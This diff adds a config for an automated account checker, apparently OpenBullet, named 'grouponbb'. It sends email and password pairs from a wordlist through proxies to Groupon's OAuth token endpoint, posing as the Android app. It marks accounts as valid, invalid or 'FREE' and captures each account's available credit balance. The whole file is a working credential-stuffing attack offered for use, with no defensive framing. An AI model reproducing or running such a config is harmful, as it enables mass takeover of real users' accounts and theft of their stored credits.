@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "grouponbb",
+  "SuggestedBots": 10,
+  "LastModified": "2018-08-26T08:39:03.5057599+00:00",
+  "AdditionalInfo": "",
+  "Author": "leehzet",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserMail",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api.groupon.com/v2/oauth/access_token?show=default%2CcloConsentRequired%2CcloConsentDetails&client_id=7397cf05c3361df71d4ac371af10e9d1&client_version_id=18.11.158423" AutoRedirect=TRUE 
+  CONTENT "referrer=&username=<USER>&password=<PASS>&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: gzip" 
+  HEADER "User-Agent: Groupon/rel/18.11.158423/2013 (Android 5.1.1 / Play 12874013; Samsung SM-G930F / Samsung SM-G930F; Triton PCS)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "User credentials are invalid" 
+  KEYCHAIN Success OR 
+    KEY "{\"user\":" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "amount\":0" 
+PARSE "<SOURCE>" JSON "amount" Recursive=FALSE -> CAP "creditsAvailable" "" "," 
+PARSE "<SOURCE>" JSON "formattedAmount" Recursive=FALSE -> CAP "$" "" "\"," 
